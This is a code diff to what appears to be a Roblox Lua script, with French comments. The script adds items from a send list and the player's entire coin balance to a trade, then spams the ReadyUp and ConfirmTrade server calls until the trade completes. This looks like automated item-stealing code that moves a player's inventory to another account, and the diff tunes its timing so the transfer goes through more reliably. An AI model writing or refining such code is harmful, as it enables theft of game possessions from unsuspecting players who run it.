@@ -110,19 +110,21 @@ local function addItemToTrade(itemType, ID)
     netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
 end
 
--- SYSTÈME AUTO-CONFIRM INSISTANT
+-- // SYSTÈME DE CONFIRMATION BOURRIN (FIX POUR QUAND IL MET SON STUFF)
 local function readyTrade()
     local args = { [1] = true }
     repeat
-        task.wait(0.2)
-        local success = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
-    until not inTrade or success == true
+        -- On envoie la requête ReadyUp
+        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
+        task.wait(0.3) -- Délai pour laisser le serveur respirer
+    until not inTrade or (maintradegui:FindFirstChild("Accept") and maintradegui.Accept.Visible == true)
 end
 
 local function confirmTrade()
     repeat
-        task.wait(0.2)
+        -- On bombarde le bouton ConfirmTrade tant qu'on est en trade
         netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+        task.wait(0.3)
     until not inTrade
 end
 
@@ -301,13 +303,15 @@ if #itemsToSend > 0 then
                 task.wait(0.01)
             end
 
-            local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
+            local rawText = maintradegui.Currency.Coins.Amount.Text
             local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
             if tokensamount >= 1 then
                 netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
             end
 
-            task.wait(1.5) 
+            -- Attendre que l'autre joueur mette ses items (On attend qu'il clique sur Ready lui aussi)
+            task.wait(2) 
+            
             readyTrade()
             task.wait(0.5)
             confirmTrade()
